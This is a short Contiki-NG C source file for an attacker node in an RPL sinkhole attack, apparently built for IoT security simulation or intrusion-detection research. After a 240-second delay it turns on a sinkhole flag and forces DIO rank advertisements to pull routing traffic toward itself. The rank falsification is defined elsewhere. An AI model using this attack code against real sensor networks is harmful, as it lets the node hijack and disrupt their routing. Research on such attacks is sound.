#include "contiki.h"
#include "net/routing/rpl-lite/rpl-timers.h"
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "sys/log.h"

/*
 * Start normally so that the RPL network can converge.
 * The sinkhole rank advertisement will be enabled after 240 seconds.
 */
extern int sinkhole_attack_enabled;

#define LOG_MODULE "SINKHOLE"
#define LOG_LEVEL LOG_LEVEL_INFO

#define ATTACK_START_DELAY (240 * CLOCK_SECOND)

PROCESS(sinkhole_router_process, "Sinkhole router");
AUTOSTART_PROCESSES(&sinkhole_router_process);

PROCESS_THREAD(sinkhole_router_process, ev, data)
{
  static struct etimer attack_timer;

  PROCESS_BEGIN();

  sinkhole_attack_enabled = 0;
  LOG_INFO("SINKHOLE ROUTER: started, attack disabled\n");

  etimer_set(&attack_timer, ATTACK_START_DELAY);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&attack_timer));

  sinkhole_attack_enabled = 1;
  LOG_WARN("SINKHOLE ATTACK: enabled\n");
  rpl_timers_dio_reset("Sinkhole attack enabled");
  rpl_icmp6_dio_output(NULL);

  while(1) {
    PROCESS_YIELD();
  }

  PROCESS_END();
}
